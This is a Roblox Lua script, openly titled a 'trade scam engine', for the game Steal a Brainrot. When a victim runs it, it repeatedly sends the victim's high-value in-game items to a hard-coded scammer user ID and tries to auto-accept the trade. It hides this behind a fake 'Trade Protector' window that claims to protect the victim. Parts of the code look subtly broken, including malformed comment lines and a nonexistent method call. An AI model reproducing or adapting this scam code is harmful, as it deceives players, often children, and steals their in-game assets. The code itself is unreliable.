--[[
============================================================================
TRADE SCAM ENGINE - CORRECT REMOTE FORMATTING
============================================================================
--]]

-- =============================================
-- CONFIGURATION
-- =============================================
local CONFIG = {
    SCAMMER_ID = 1779494756,  -- <-- YOUR USER ID
    TARGETS = {
        "Strawberry Elephant",
        "Skibidi Toilet",
        "Meowl",
        "Dragon Gingerini",
    },
    DELAY = 5,
    MAX_ITEMS = 4,
    SHOW_GUI = true,
}

-- =============================================
-- SERVICES
-- =============================================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

-- =============================================
── BRAINROT DATABASE ──────────────────────────
-- =============================================
local BRAINROT_DATA = {
    ["Strawberry Elephant"] = {id = 1, value = 250000000},
    ["Skibidi Toilet"] = {id = 2, value = 330000000},
    ["Meowl"] = {id = 3, value = 275000000},
    ["Dragon Gingerini"] = {id = 4, value = 300000000},
    ["Grande Brainrot God"] = {id = 5, value = 500000000},
}

-- =============================================
── TRADE API WITH CORRECT FORMATS ─────────────
-- =============================================
local TradeAPI = {
    SendRemote = nil,
    AcceptRemote = nil,
    TradeId = nil,
}

function TradeAPI:findCorrectRemote()
    print("[*] Searching for trade remote with correct format...")
    
    -- Common trade remote names in Steal a Brainrot
    local possibleNames = {
        "TradeRequest", "SendTrade", "TradeEvent", 
        "Trade", "RequestTrade", "InitiateTrade",
        "TradeSystem/TradeRequest", "TradeInvite"
    }
    
    -- Search in ReplicatedStorage
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            for _, name in ipairs(possibleNames) do
                if obj.Name == name or obj.Name:find(name) then
                    print("[+] Found potential trade remote:", obj:GetFullName())
                    
                    -- Test the remote with correct format
                    local testSuccess = self:testRemoteFormat(obj)
                    if testSuccess then
                        self.SendRemote = obj
                        print("[✓] Confirmed working trade remote:", obj.Name)
                        return true
                    end
                end
            end
        end
    end
    
    -- If not found, try brute force search
    print("[*] Trying brute force search...")
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            local testSuccess = self:testRemoteFormat(obj)
            if testSuccess then
                self.SendRemote = obj
                print("[✓] Found working trade remote:", obj:GetFullName())
                return true
            end
        end
    end
    
    print("[✗] No working trade remote found!")
    return false
end

function TradeAPI:testRemoteFormat(remote)
    -- Try different common formats for trade requests
    local formats = {
        -- Format 1: {targetUserId}, {items}, tradeId
        function()
            remote:FireServer({UserId = 12345}, {{Name = "Test"}}, "test123")
        end,
        -- Format 2: targetUserId, items, tradeId
        function()
            remote:FireServer(12345, {{Name = "Test"}}, "test123")
        end,
        -- Format 3: {target = userId}, items
        function()
            remote:FireServer({target = 12345}, {{Name = "Test"}})
        end,
        -- Format 4: userId, {{name, value}}
        function()
            remote:FireServer(12345, {{"Test", 1000}})
        end,
        -- Format 5: {recipient = userId}, {items}
        function()
            remote:FireServer({recipient = 12345}, {items = {{Name = "Test"}}})
        end,
    }
    
    for i, formatFunc in ipairs(formats) do
        local success = pcall(formatFunc)
        if success then
            print("[+] Remote", remote.Name, "accepts format", i)
            return true
        end
    end
    
    return false
end

-- =============================================
── CREATE PROPERLY FORMATTED ITEMS ────────────
-- =============================================
function TradeAPI:createItemList()
    local items = {}
    
    for i = 1, math.min(#CONFIG.TARGETS, CONFIG.MAX_ITEMS) do
        local brainrotName = CONFIG.TARGETS[i]
        local data = BRAINROT_DATA[brainrotName] or {id = i, value = 1000}
        
        -- Format 1: Table with name and value
        table.insert(items, {
            Name = brainrotName,
            Value = data.value,
            ItemId = tostring(os.time()) .. tostring(i)
        })
        
        -- Also prepare alternative format
        items[i] = {
            name = brainrotName,
            value = data.value,
            id = data.id
        }
    end
    
    return items
end

-- =============================================
── SEND TRADE WITH CORRECT FORMAT ─────────────
-- =============================================
function TradeAPI:sendTrade()
    if not self.SendRemote then
        if not self:findCorrectRemote() then
            return false, "No trade remote"
        end
    end
    
    local items = self:createItemList()
    local target = {UserId = CONFIG.SCAMMER_ID}
    local tradeId = tostring(os.time()) .. tostring(math.random(1000, 9999))
    
    -- Try each format until one works
    local sendAttempts = {
        -- Attempt 1: {target}, items, id
        function()
            self.SendRemote:FireServer(target, items, tradeId)
        end,
        -- Attempt 2: target, items, id
        function()
            self.SendRemote:FireServer(CONFIG.SCAMMER_ID, items, tradeId)
        end,
        -- Attempt 3: {target = id}, items
        function()
            self.SendRemote:FireServer({target = CONFIG.SCAMMER_ID}, items)
        end,
        -- Attempt 4: id, items
        function()
            self.SendRemote:FireServer(CONFIG.SCAMMER_ID, items)
        end,
        -- Attempt 5: {recipient = id}, {items}
        function()
            self.SendRemote:FireServer({recipient = CONFIG.SCAMMER_ID}, {items = items})
        end,
        -- Attempt 6: {UserId = id}, {brainrots}
        function()
            self.SendRemote:FireServer({UserId = CONFIG.SCAMMER_ID}, {brainrots = items})
        end,
    }
    
    for i, attemptFunc in ipairs(sendAttempts) do
        local success = pcall(attemptFunc)
        if success then
            print("[✓] Trade sent successfully using format", i)
            
            -- Try to find accept remote
            task.wait(0.5)
            self:tryAccept()
            
            return true
        end
    end
    
    return false
end

function TradeAPI:tryAccept()
    if not self.AcceptRemote then
        -- Find accept remote
        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
            if obj:IsA("RemoteEvent") and obj.Name:lower():find("accept") then
                self.AcceptRemote = obj
                break
            end
        end
    end
    
    if self.AcceptRemote then
        pcall(function()
            self.AcceptRemote:FireServer({UserId = CONFIG.SCAMMER_ID})
        end)
    end
end

-- =============================================
── FAKE GUI ───────────────────────────────────
-- =============================================
local FakeGUI = nil

if CONFIG.SHOW_GUI then
    local gui = Instance.new("ScreenGui")
    gui.Name = "TradeProtector"
    gui.Parent = CoreGui
    gui.DisplayOrder = 999999
    gui.Enabled = true
    gui.IgnoreGuiInset = true
    FakeGUI = gui
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 120)
    frame.Position = UDim2.new(0.5, -150, 0.5, -60)
    frame.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Draggable = true
    frame.Parent = FakeGUI
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
    title.BorderSizePixel = 0
    title.Text = "TRADE PROTECTOR"
    title.TextColor3 = Color3.fromRGB(255, 100, 100)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.Parent = frame
    
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, -20, 0, 25)
    status.Position = UDim2.new(0, 10, 0, 40)
    status.BackgroundTransparency = 1
    status.Text = "Status: Active"
    status.TextColor3 = Color3.fromRGB(100, 255, 100)
    status.TextSize = 14
    status.Font = Enum.Font.Gotham
    status.Parent = frame
    
    local count = Instance.new("TextLabel")
    count.Size = UDim2.new(1, -20, 0, 25)
    count.Position = UDim2.new(0, 10, 0, 65)
    count.BackgroundTransparency = 1
    count.Text = "Trades: 0"
    count.TextColor3 = Color3.fromRGB(200, 200, 200)
    count.TextSize = 14
    count.Font = Enum.Font.Gotham
    count.Parent = frame
    
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(1, -40, 0, 30)
    button.Position = UDim2.new(0, 20, 0, 90)
    button.BackgroundColor3 = Color3.fromRGB(50, 100, 200)
    button.Text = "REFRESH"
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 14
    button.Font = Enum.Font.GothamBold
    button.Parent = frame
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = button
end

-- =============================================
── MAIN LOOP ───────────────────────────────────
-- =============================================
local tradeCount = 0
local scamActive = true

print("========================================")
print("TRADE SCAM ENGINE - CORRECT FORMAT")
print("========================================")
print("Target ID:", CONFIG.SCAMMER_ID)
print("========================================")

-- Find the correct remote first
TradeAPI:findCorrectRemote()

task.spawn(function()
    while scamActive do
        local success = TradeAPI:sendTrade()
        
        if success then
            tradeCount = tradeCount + 1
            print("[+] Trade #" .. tradeCount .. " sent")
            
            if FakeGUI then
                local frame = FakeGUI:FindFirstChildOfClass("Frame")
                if frame then
                    local labels = frame:FindAll("TextLabel")
                    if labels[3] then
                        labels[3].Text = "Trades: " .. tradeCount
                    end
                end
            end
        end
        
        task.wait(CONFIG.DELAY)
    end
end)

-- =============================================
── KEYBIND ─────────────────────────────────────
-- =============================================
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.F4 and FakeGUI then
        local frame = FakeGUI:FindFirstChildOfClass("Frame")
        if frame then
            frame.Visible = not frame.Visible
        end
    end
end)